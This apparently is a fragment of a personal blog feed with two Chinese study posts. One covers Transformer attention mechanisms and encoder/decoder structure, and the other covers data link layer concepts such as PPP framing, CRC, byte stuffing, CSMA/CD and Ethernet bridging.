    <url>/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="基于Transformer和视觉Transformer的注意力机制"><a href="#基于Transformer和视觉Transformer的注意力机制" class="headerlink" title="基于Transformer和视觉Transformer的注意力机制"></a>基于Transformer和视觉Transformer的注意力机制</h1><p>基于注意力机制的神经网络是一种强大的工具。根据输入特征的重要性来分配神经网络的资源调整权重，使神经网络集中处理输入中的关键信息，提高模型的准确性和鲁棒性</p>
<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer是一种基于注意力机制的序列模型，最初由Google的研究团队提出并应用于机器翻译任务。Transformer仅使用自注意力机制（self-attention）来处理输入序列和输出序列，因此可以并行计算，极大地提高了计算效率。下面是Transformer的详细解释。</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126110435700.png" class title="image-20231126110435700">

<h3 id="自注意力机制"><a href="#自注意力机制" class="headerlink" title="自注意力机制"></a>自注意力机制</h3><p>允许模型在处理序列时，将输入序列的每个元素与其他元素进行比较，以便在不同上下文中正确的处理每个元素</p>
<p>有三个重要输入矩阵：查询矩阵Q、键矩阵K、值矩阵V，这三个矩阵都是由输入序列X经过不同的线性变换得到的。</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126111037685.png" class title="image-20231126111037685">

<p>查询矩阵Q和键矩阵K经过softmax函数得到一个概率分布，该分布表示每个元素对于查询矩阵Q的重要性</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126112444948.png" class title="image-20231126112444948">

<p>将这个概率分布乘以值矩阵V得到注意力向量，表示每个元素的值加权平均后的结果</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126112622081.png" class title="image-20231126112622081">

<h3 id="多头注意力机制"><a href="#多头注意力机制" class="headerlink" title="多头注意力机制"></a>多头注意力机制</h3><p>多个并行的自注意力机制进行处理</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126112748485.png" class title="image-20231126112748485">

<p>得到多个自注意力向量</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126112831395.png" class title="image-20231126112831395">

<h3 id="模型结构"><a href="#模型结构" class="headerlink" title="模型结构"></a>模型结构</h3><p>Transformer模型由编码器和解码器两部分组成，模型结构如下</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126113538794.png" class title="image-20231126113538794">

<p>左侧为encoder部分，右侧为decoder部分，N表示encoder和decoder有N个block，会经过N次的encoder、decoder过程，如下(N&#x3D;6)</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126113629984.png" class title="image-20231126113629984">

<p>整体结构来分析工作流程：</p>
<ul>
<li><p>将输入特征转换为自注意力向量矩阵</p>
</li>
<li><p>将自注意力矩阵输入到encoder部分输出编码矩阵</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126114219338.png" class title="image-20231126114219338">
</li>
<li><p>将编码矩阵C传给encoder并结合输入的目标语言的词矩阵，根据翻译过的单词来预测下一个单词</p>
</li>
</ul>
<p>下图中，左侧根据句子开始符 “Begin” （第0个单词），预测第一个单词单词 “I” ；右侧根据开始符 “Begin” 和单词 “I”，预测单词 “have”，以此类推，得到整个句子的翻译结果。</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126114518479.png" class title="image-20231126114518479">

<h4 id="Transformer-Encoder"><a href="#Transformer-Encoder" class="headerlink" title="Transformer Encoder"></a>Transformer Encoder</h4><p>单个Encoder Block是由Multi-Head Attention、Add &amp; Norm、Feed Forward、Add &amp; Norm组成，经过N次encoder block堆叠再输出。第一个encoder block的输入是经过两层embedding得到的，后续几个Encoder Block则是前一个Encoder Block的输出。</p>
<p>下图中红色方框为Encoder Block结构：</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126114924606.png" class title="image-20231126114924606">

<p><strong>Multi-Head Attention</strong></p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126115213543.png" class title="image-20231126115213543">

<p>将多个输出拼接在一起然后进行线性变换来降低维度</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126115319733.png" class title="image-20231126115319733">

<p><strong>Add &amp; Norm</strong></p>
<p><strong>Add</strong>，加上类似ResNet提出的残差连接，用来解决深层网络训练不稳定的问题，防止梯度消失（不稳定指：深度神经网络随着网络层数的增加，loss逐渐减小，然后趋于稳定达到饱和，然后再继续增加网络层数，loss反而增大）。</p>
<p><strong>Norm</strong>（Normalize）为归一化层（加快训练速度、提高训练的稳定性），这里用的是Layer Norm。</p>
<p><strong>Feed Forward</strong></p>
<p>前馈神经网络（Feed-Forward Networks）这一层由两个全连接层（<strong>MLP</strong>：多层感知机）构成，第一层的激活函数为Relu，第二层不使用激活函数。对应公式如下：<br>$$<br>FFN(x) &#x3D; max(0,XW_1+b_1)W_2+b_2<br>$$</p>
<h4 id="Transformer-Decoder"><a href="#Transformer-Decoder" class="headerlink" title="Transformer Decoder"></a>Transformer Decoder</h4><p>Decoder Block也由Multi-Head Attention、Add &amp; Norm、Feed Forward组成，但Decoder Block中的Multi-Head Attention与Encoder Block中的不同。下图中红色方框部分为Decoder Block结构：</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126115830178.png" class title="image-20231126115830178">

<p>可以看到图中两个Multi-Head Attention层</p>
<ul>
<li>第一个采用了Masked操作</li>
<li>第二个的K和V使用了Encoder的编码信息矩阵C，而Q使用上一个Decoder Block的输出</li>
</ul>
<p><strong>Masked Multi-Head Attention</strong></p>
<p>作为Decoder Block的第一个 Multi-Head Attention，它采用了 Mask 操作，因为在翻译的过程中是按顺序翻译的，即翻译完第 i 个单词，才可以翻译第 i+1 个单词。通过 Mask 操作可以防止第 i 个单词知道第 i 个单词之后的信息。</p>
<p>下面以 “我有一只猫” 翻译成 “I have a cat” 为例，了解一下 Mask 操作。</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126140916297.png" class title="image-20231126140916297">

<p>如上图所示。首先根据输入 “<Begin>“ 预测出第一个单词为 “I”，然后根据输入 “<Begin> I” 预测下一个单词 “have”。</Begin></Begin></p>
<p>mask过程：</p>
<ul>
<li>根据输入矩阵生成Mask矩阵。输入矩阵包含 “<Begin> I have a cat” (0, 1, 2, 3, 4) 共5个单词的表示向量</Begin></li>
</ul>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126141148617.png" class title="image-20231126141148617">

<ul>
<li><p>通过矩阵X线性计算Q、K、V矩阵，然后计算$QK^T$</p>
</li>
<li><p>使用softmax()计算自注意力向量</p>
</li>
</ul>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126141459079.png" class title="image-20231126141459079">

<p><strong>Multi-Head Cross-Attention</strong></p>
<p>Decoder Block 第二个 Multi-Head Attention 也叫多头交叉注意力（Multi-Head Cross-Attention），主要的区别在于 Attention 的 <strong>K, V 矩阵</strong>不是来自上一个 Decoder Block 的输出计算的，而是<strong>来自Encoder输出的编码信息矩阵C</strong>，<strong>Q</strong>还是根据上一个Decoder Block 的输出 Z 得到的</p>
<h3 id="Transformer输出"><a href="#Transformer输出" class="headerlink" title="Transformer输出"></a>Transformer输出</h3><p>通过N次Decode Block后，再经过一次线性变换，然后经过Softmax得到输出的概率分布，分类数为字典长度，输出概率最大的单词作为我们的预测输出</p>
<img src="/2023/11/26/%E5%9F%BA%E4%BA%8ETransformer%E5%92%8C%E8%A7%86%E8%A7%89Transformer%E7%9A%84%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/image-20231126141732856.png" class title="image-20231126141732856">

<p><strong>Linear层</strong>将 Decoder Block 输出的编码矩阵，转化成一个跟词表大小一样的 logit 矩阵。词表通常很大，比如 WMT翻译任务中，英德词表有三万多个 subword</p>
]]></content>
      <categories>
        <category>机器学习</category>
        <category>神经网络</category>
      </categories>
      <tags>
        <tag>-Transformer -神经网络 -机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>数据链路层知识要点</title>
    <url>/2022/07/20/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/</url>
    <content><![CDATA[<h1 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a><strong>数据链路层</strong></h1><p>信道类型：点对点信道(PPP)、广播信道</p>
<h2 id="三个基本问题"><a href="#三个基本问题" class="headerlink" title="三个基本问题"></a>三个基本问题</h2><p><strong>封装成帧：</strong>将上层的IP数据报分组前后添加首部和尾部构成一个数据帧。帧定界(首尾部)。<br><strong>透明传输：</strong>使用字节填充和比特填充使得PDU里面不包含帧定界符。发送端数据链路层在”SOH”,”EOT”的前面插入一个转义字符”ESC”，接收端的数据链路层在将数据发送到网络层之前删除插入的转义字符。<br><strong>差错检测：</strong>在数据后面添加的冗余码(FCS),使用循环冗余检验方法(CRC)进行帧差错检测。</p>
<p>冗余码计算：在数据(k位)后面添加n个0(根据生成多项式最高项数决定)，使用(k+n)位的数除以(n+1)位的除数P进行除法得到商Q和余数R(n位)，把余数R作为冗余码添加在数据M后面进行发送。即发送的数据是：2nM+R。</p>
<p>CRC原理：在发送端时将分组数据后面添加n位冗余码一起发送。接受端对得到帧数进行检验，若余数R&#x3D;0则帧无差错，否则有差错。</p>
<p>差错控制基本方式：检错反馈&#x2F;重发、 前向纠错方式、混合法。</p>
<h2 id="点对点协议-PPP"><a href="#点对点协议-PPP" class="headerlink" title="点对点协议(PPP)"></a>点对点协议(PPP)</h2><p>在串行链路上封装ip数据报的方法，异步链路和同步链路。</p>
<p>链路控制协议(Link Control Protocol,LCP)：用于建立、配置和测试数据链路连接、通信的选项。</p>
<p>网络控制协议(Network Control Protocol,NCP)：用于建立、配置多种不同网络层协议。</p>
<h3 id="ppp帧格式"><a href="#ppp帧格式" class="headerlink" title="ppp帧格式"></a><strong>ppp帧格式</strong></h3><p>首部四个字段和尾部两个字段</p>
<img src="/2022/07/20/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20221006212140353.png" class title="image-20221006212140353">

<p><strong>ppp首部</strong></p>
<p>首部中的标志字段F(Flag)，规定为0x7E(符号0x表示它后面的字符是用十六进制表示的。十六进制的7E的二进制表示是01111110)，标志字段表示一个帧的开始。<br>首部中的地址字段A规定为0xFF(即11111111)。<br>首部中的控制字段C规定为0x03(即00000011)。<br>首部中的2字节的协议字段：<br>(1)当协议字段为0x0021时，PPP帧的信息字段就是IP数据报。<br>(2)当协议字段为0xC021时，PPP帧的信息字段就是PPP链路控制协议LCP的数据。<br>(3)当协议字段为0x8021时，PPP帧的信息字段就是网络层的控制数据。<br><strong>ppp中间部分</strong>为信息长度，即为ip数据报长度，小于MTU1500字节。</p>
<p><strong>ppp尾部</strong></p>
<ul>
<li>尾部中的第一个字段(2个字节)是使用CRC的帧检验序列FCS。</li>
<li>尾部中的标志字段F(Flag)，规定为0x7E(符号0x表示它后面的字符是用十六进制表示的。十六进制的7E的二进制表示是01111110)，标志字段表示一个帧的结束。</li>
</ul>
<p>标志字段就是ppp帧的定界符</p>
<h3 id="透明传输实现方式"><a href="#透明传输实现方式" class="headerlink" title="透明传输实现方式"></a>透明传输实现方式</h3><h4 id="字节填充"><a href="#字节填充" class="headerlink" title="字节填充"></a>字节填充</h4><p>当PPP使用异步传输时，它把转义符定义为0x7D，并使用字节填充。<br>RFC1662规定了如下填充方法：<br>(1)把信息字段中出现的每一个0x7E字节转变为2字节序列(0x7D，0x5E)。<br>(2)若信息字段中出现一个0x7D的字节(即出现了和转义字符一样的比特组合)，则把转义字符0x7D转变为2字节序列(0x7D，0x5D)。<br>(3)若信息字段中出现ASCII码的控制字符(即数值小于0x20的字符)，则在该字符前面要加入一个0x7D字节，同时将该字符的编码加以改变。例如，出现0x03(在控制字符中是“传输结束”ETX)就要把它转变为2字节序列的(0x7D，0x31)。<br>由于在发送端进行了字节填充，因此在链路上传送的信息字节数就超过了原来的信息字节数。但接收端在接收到数据后再进行与发送端字节填充相反的变换，就可以正确地恢复出原来的信息。</p>
<p>0x7D,0X5E –&gt; 0x7E(帧定界标识符)    0x7D(转义符) –&gt; 0x7D,0X5D</p>
<h4 id="零比特填充"><a href="#零比特填充" class="headerlink" title="零比特填充"></a>零比特填充</h4><p>当PPP使用同步传输时，使用零比特填充。<br><strong>零比特填充的具体方法</strong>：<br>(1)在发送端先扫描整个信息字段(通常使用硬件实现，但也可以用软件实现，但是会慢一些)。<br>(2)只要发现有5个连续的1，则立即填入一个0。<br>(3)接收端在收到一个帧时，先找到标志字段F以确定帧的边界，接着再用硬件对其中的比特流进行扫描，每当发现5个连续1时，就把5个连续1后的一个0删除，以还原成原来的信息比特流。<br>因此通过这种零比特填充后的数据，就可以保证在信息字段中不会出现连续6个1。</p>
<h3 id="ppp协议工作状态"><a href="#ppp协议工作状态" class="headerlink" title="ppp协议工作状态"></a>ppp协议工作状态</h3><img src="/2022/07/20/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20221006213558872.png" class title="image-20221006213558872">

<p>工作流程：</p>
<p>1、用户通过调制解调器呼叫路由器拨号接入 ISP 后，就建立了一条从用户pc 到 ISP 的物理连接(物理层)。<br>2、用户pc 向 ISP 发送一系列的链路控制协议LCP分组（封装成多个 PPP 帧），这些分组及其响应选择了将要使用的一些PPP参数，建立LCP连接(配置确认帧、配置否认帧、配置拒绝帧)</p>
<p>3、LCP连接建立后，传送特定格式的分组来鉴别彼此的身份。</p>
<p>3、LCP连接鉴别成功后，进行NCP配置协商，网络控制协议NCP给新接入的用户pc分配一个临时IP，建立 NCP链路，可以开始通信<br>4、用户通信完毕，发送终止请求LCP分组，NCP释放网络层连接，收回临时IP，转入链路终止状态。然后LCP释放数据链路层连接。最后释放物理层连接。</p>
<h3 id="ppp协议特点"><a href="#ppp协议特点" class="headerlink" title="ppp协议特点"></a>ppp协议特点</h3><ul>
<li>简单。接收方每收到一个数据帧就对其进行CRC检验，正确就收下，否则就丢弃</li>
<li>封装成帧。规定特殊字符作为帧定界字符，使得接收方能准确找到帧开始和结束位置。</li>
<li>透明传输。数据中出现与帧定界符号相同比特组合时，规定一些措施解决这个问题</li>
<li>支持多种网络协议在同一条链路上运行。</li>
<li>支持多种链路上运行。串行和并行，同步或异步，低速或高速。</li>
</ul>
<p>ppp链路适用于线路质量不太差的情况下。</p>
<p>ppp不使用帧的编号，帧的编号为了帧传输出错时有效重传，但由于ppp协议不需要实现可靠传输，不使用帧的编号。</p>
<p>ppp协议不能用于可靠传输原因：当通信质量太差的情况下，由于ppp帧没有使用编号和确认机制，必须依靠有编号和重传机制的上层协议来保证数据传输，这样就使得数据传输效率低下，浪费网络资源。</p>
<h2 id="广播信道"><a href="#广播信道" class="headerlink" title="广播信道"></a>广播信道</h2><h3 id="局域网中的数据链路层"><a href="#局域网中的数据链路层" class="headerlink" title="局域网中的数据链路层"></a>局域网中的数据链路层</h3><p>按网络拓扑划分：星形线(由于集线器和双绞线使用广泛应用)、环形网、总线网(避免电磁波反射)、网状网络</p>
<p>共享信道技术：</p>
<ul>
<li>静态划分：频分复用、时分复用、波分复用、码分复用等</li>
<li>动态媒体接入控制：多点接入。随机接入+受控接入</li>
</ul>
<p>“传统以太网”指10Mb&#x2F;s的以太网。</p>
<p>以太网两个标准：DIX Ethernet V2(严格以太网)+IEE 802.3(拆分成逻辑链路控制LLC、媒体接入控制MAC子层)</p>
<p>适配器(网卡)：数据串行和并行传输的转换，计算机MAC地址在适配器的ROM中，IP地址在计算机的存储器中。</p>
<h3 id="CSMA-x2F-CD协议"><a href="#CSMA-x2F-CD协议" class="headerlink" title="CSMA&#x2F;CD协议"></a><strong>CSMA&#x2F;CD协议</strong></h3><p>载波监听多址接入&#x2F;碰撞检测(Carrier Sense Multiple Access with Collision Detection)</p>
<p><strong>载波监听多址接入</strong>：在计算机以多点接入在一根总线的计算机网络中，每个站点在发送数据之前需要先检测总线是否被占用，若线路被占用则不发送数据以免发生碰撞，否则就发送数据。使用电子技术检测总线是否存在数据信号。</p>
<p><strong>碰撞检测</strong>：计算机边发数据边检测信道上的信号电压大小。</p>
<p>使用该协议的以太网只能进行双向交替通信(半双工通信)。</p>
<p>集线器工作在物理层(物理结构星型，逻辑为总线型)，网桥在数据链路层。</p>
<p>电磁波在1km电缆传播时延约为5us.</p>
<p><strong>MAC地址</strong>：在局域网中计算机适配器ROM的硬件地址，物理地址(48位地址&#x2F;6个字节)。IEEE的注册管理机构RA向厂家分配    地址字段的前3个字节(高位24位)，地址字段中的后3个字节(低位24位)由厂家自行指派(扩展标识符)。</p>
<p><strong>以太网MAC帧格式标准</strong>：DIX Ethernet V2标准，IEEE的802.3标准</p>
<p>为了确保发送站点在传输时检测可能的冲突，数据帧的传输时延至少要等于信号传播时延的2倍。争用期就是以太网端到端往返时间2r，碰撞窗口。</p>
<p>以太网帧格式：</p>
<img src="/2022/07/20/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220807132654604.png" class title="image-20220807132654604">

<p>以太网V2帧首部14字节，尾部4字节。</p>
<img src="/2022/07/20/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220807132620903.png" class title="image-20220807132620903">

<p>前同步码：是接收端适配器和发送端时钟同步，实现位同步</p>
<p>帧开始定界符：提示适配器准备接收发送端MAC帧</p>
<h2 id="扩展以太网"><a href="#扩展以太网" class="headerlink" title="扩展以太网"></a>扩展以太网</h2><h3 id="物理层扩展以太网"><a href="#物理层扩展以太网" class="headerlink" title="物理层扩展以太网"></a>物理层扩展以太网</h3><p>扩展主机和集线器之间距离使用光纤(一对光纤)和一对光纤调制解调器(光电信号转换)。</p>
<p>基本使用集线器的双绞线以太网，在物理上是星型的，在逻辑上是总线型的</p>
<h3 id="数据链路层扩展"><a href="#数据链路层扩展" class="headerlink" title="数据链路层扩展"></a>数据链路层扩展</h3><p>网桥：根据MAC帧的目的地址对收到的帧进行转发和过滤，存储转发方式。</p>
<p>网桥依赖转发表来转发帧不改变帧的源地址，通过内部接口管理软件和网桥协议实体实现。增大了时延，可能产生广播风暴。</p>
<p><strong>透明网桥</strong></p>
<p>标准是IEEE802.1D，无需人工配置，将每收到的帧记录器源地址和进入网桥接口建立转发表。</p>
<p>网桥自学习和转发帧的一般步骤：</p>
<ul>
<li>收到帧后自学习，查找转发表是否有与收到帧源地址相匹配的项目，没有就增加，有就更新</li>
<li>查找转发表中是否存在与收到帧目的地址相匹配的项目，有就通过该接口进行转发，没有就将该帧通过其他接口进行转发。注意的是当转发表中给出的接口为进入网桥的接口时，则丢弃该帧。</li>
</ul>
<p>生成树算法：将互连在一起的网桥在彼此通信后，找到原来的网络拓扑的一个子集。(不存在回路，任何两个站之间只有一条路径)</p>
<p><strong>源路由网桥</strong></p>
<p>由发送帧的源站负责路由选择。源站项目的站广播发送发现帧，传送过程中发现帧记录经过路由，使得源站选择一个最佳路由；帮助源站确定通过帧的最大路由。</p>
<p><strong>多接口网桥-以太网交换机</strong></p>
<p>多接口网桥。方便实现VLAN(虚拟局域网)服务，限制接收广播信息的工作站数，避免广播风暴。</p>
<p>帧格式：在以太网帧格式加入4字节的VLAN标记，区分虚拟局域网。</p>
<h2 id="高速以太网"><a href="#高速以太网" class="headerlink" title="高速以太网"></a>高速以太网</h2><p><strong>100Base-T以太网</strong></p>
<p>速率达到或超过100Mb&#x2F;s的以太网。</p>
<p>可在全双工方式下工作而无冲突发送。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">物理层标准：</span><br><span class="line"></span><br><span class="line">100Base-TX:使用两对UTP5类线或屏蔽双绞线STP 100m</span><br><span class="line">100Base-FX:使用两对光纤 2000m</span><br><span class="line">100Base-T4:使用四队UTP3类线或5类线 100m</span><br></pre></td></tr></table></figure>

<p><strong>吉比特以太网</strong></p>
<p>速率达到或超过1000Mb&#x2F;s的以太网。</p>
<p>10GE只工作在全双工方式</p>
<p><strong>以太网进行宽带接入</strong></p>
<p>FTTx使用pppoe方式进行接入</p>
<h2 id="知识要点"><a href="#知识要点" class="headerlink" title="知识要点"></a>知识要点</h2><p>1、通过一些数据链路层协议，在不太可靠的物理链路上实现可靠的数据传输。</p>
<p>2、数据链路层中数据传送单位是帧。</p>
<p>3、在计算机通信中，采用检错重发进行差错控制。</p>
<p>4、链路的两种基本配置，非平衡配置和平衡配置</p>
<p>5、用户接入的方法是，用户使用拨号电话线接入和使用专线接入</p>
<p>6、载波监听多路访问CSMA技术的退避算法有非坚持、1-坚持、P-坚持。</p>
<p>7、ATM的信元具有固定的长度，为53字节，其中5字节是信头，48是信息段。</p>
<p>8、以太网交换机的数据转发方式分为 直接交换、存储转发交换、改进的直接交换</p>
<h2 id="简答题"><a href="#简答题" class="headerlink" title="简答题"></a>简答题</h2><p>1、在停止等待协议中，应答帧中不需要序号。</p>
<p>答：接收方每接到一个正确的数据后，都立即向发送方回送个应答帧，发送方只有收到上一个数据的确认帧后，才继续发送下一帧。无需对应答帧进行编号。</p>
<p>2、HDLC帧各字段的意义。</p>
<p>标志字段F：标明帧的开始和结束</p>
<p>地址字段A：非平衡方式传送时写入次站的地址，在平衡方式下填入应答站的地址。</p>
<p>帧校验序列FCS：检验所有地址字段</p>
<p>控制字段C。</p>
<p>根据标志字段和地址字段比特的取值将HDLC帧划分为信息帧、监控帧和无编号帧。</p>
<p>3、零比特填充法。</p>
<p>在HDLC的帧结构中，若在两个标志字段之间的比特串中出现了标志字段F(0011111100，6个连续的1)会被误认为是帧边界。避免这种情况使用零比特填充法进行处理。具体做法：当发送端数据检测到5个连续1时，立即在后面填上一个0.在接收端发现5个连续的1时，将这5个连续1后的0删除进行还原。</p>
<p>4、正常响应方式特点。</p>
<p>只有主站才能发起向次站的数据传输，而次站只有在主站向她发送命令帧进行轮询时才以响应帧的形式回答主站。</p>
<p>5、数据链路层功能</p>
<p>通过一系列的控制和管理，构成透明的、相对无差错的数据链路，向网络层提供可靠、有效的数据帧传送服务。主要功能包括链路管理、帧定界、流量控制、差错控制、数据和控制信息的识别、透明传输和寻址。</p>
<p>6、差错控制方法及其特点。</p>
<p>检错重发(ARQ)：接收端检测到接受信息有错时，通过自动要求发送重发保存的副本以达到纠错的目的。(需要编码)</p>
<p>前向纠错(FEC)：接受端检测到接受信息有错后，通过计算确定差错位置并自动加以纠正。(需要编码)</p>
<p>混合方式：接受端采取纠检错混合，对少量差错予以自动纠正，超过其纠正能力的差错通过重发的方法加以纠正。</p>
<p>信息反馈(IRQ)：接收端把收到的数据序列全部由反向信道送回给发送端，发送端比较其发送的数据序列和送回的数据序列从而发现是否有错误，并把认为错误的数据序列的原始数据再次发送直到发送端没有发现错误为止。(不需要编码)</p>
<p>7、网络适配器的作用对数据的串行和并行传输进行转换，并且能够对缓存数据进行操作实现以太网协议，实现帧的传送和接受、对帧进行封闭等。工作在物理层和数据链路层。</p>
<p>8、帧定界使接收方能从收到的比特流中准确的区分出一个帧数据的开始和结束在什么地方，避免发生帧数据错误，造成数据混乱导致通信失败；透明传输使得不管所传数据是什么样的比特组合都能够在链路上传送；差错控制主要包括差错检测和差错纠正，降低传输的比特差错率。</p>
<p>9、PPP协议工作状态：“链路静止”状态、“链路建立“状态、”鉴别”状态、“网络层协议”状态、“链路打开”状态和“链路终止”状态。</p>
<p>用户要使用PPP协议和ISP建立连接进行通信需要建立的连接为链路静止、链路建立、鉴别、网络层协议、链路打开。</p>
<p>链路静止时，在用户PC和ISP的路由器之间并不存在物理层的连接。</p>
<p>链路建立时，目的是建立链路层的LCP连接，协商配置选项。</p>
<p>鉴别时，只允许传送LCP协议的分组、鉴别协议的分组以及监测链路质量的分组，发送身份标识符和口令。</p>
<p>网络层协议时，PPP链路两端的网络控制协议NCP根据网络层的不同协议互相交换网络层特定的网络控制分组。</p>
<p>链路打开时，链路的两个PPP端点可以彼此向对方发送分组。</p>
<p>10、局域网的主要特点</p>
<p>（1）功能角度：</p>
<p>共享传输信道，多个系统连接到一个共享的通信媒体。</p>
<p>地理范围有限，用户个数有限。覆盖范围一般在10m - 10Km</p>
<p>传输速率高。一般在1-100Mb&#x2F;s</p>
<p>误码率低，近距离传输。</p>
<p>多采用分布式控制和广播式通信。</p>
<p>（2）网络体系结构和传输规程：</p>
<p>底层协议简单。距离短、时延小、成本低、传输速率高、可靠性高。</p>
<p>不单独设置网络层。网内一般不需要中间转换，流量控制和路由选择</p>
<p>采用多种媒体访问控制技术。</p>
<p>局域网采用广播通信是因为局域网中的机器都连接到同一条物理线路，所有主机的数据传输都经过这条链路。将主机要发送的数据发送到公用链路上的所有主机，接收端通过地址对比接收属于自己的数据并丢弃其他数据。广域网是由更大的地理空间、更多的主机构成的网络，若使用广播通信可能会导致网络无法运行。当主机A向主机B发送数据时，是向网络中所有的主机发送数据，当主机数量庞大时，严重消耗主机A的处理能力，造成数据的无效流动，易产生广播风暴，使网络无法运行。</p>
<p>11、常用的局域网的网络拓扑有总线网、星形网、环型网、树型网。现在最流行的是<strong>星形网络拓扑</strong>。</p>
<p>当时可靠的星形拓扑结构较贵，并且无源的总线型结构更加可靠。但当连接有大量站点的总线式以太网很容易出现故障，而现在专用的ASIC芯片使用可以将星形结构的集线器做的非常可靠。</p>
<p>12、以太网是现有局域网采用最通用的通信协议标准。传统以太网一种传输速率为10Mb&#x2F;s的以太网。在以太网中，采用共享传输媒体，所有主机通过总线型拓扑结构连接在同一条同轴电缆上，采用CSMA&#x2F;CD(载波监听多址接入&#x2F;碰撞监测)方法进行传输。</p>
<p>以太网封装帧格式：<strong>DIX Ethernet V2标准、IEE802.3标准</strong></p>
<p>13、码元传输速率为波特率。以太网使用曼彻斯特编码(用电平跳变来表示1或0的编码方法)，即意味着发送的每一位都有两个信号周期。波特率为数据速率的两倍。</p>
<p>14、为了能使数据链路层更好使用多种局域网标准，802委员将局域网的数据链路层拆成两个子层，逻辑链路控制(LLC)子层和媒体介入控制(MAC)子层与接入传输媒体有关的内容都放在MAC子层中，而LLC子层与传输媒体无关，不管采用何种协议的局域网对LLC子层都是透明的。并且由于现在TCP&#x2F;ip体系经常使用的局域网协议是DIX Ethernet V2而不是802.3，所以逻辑链路控制子层(LLC)的作用已经不大啦，很少使用。</p>
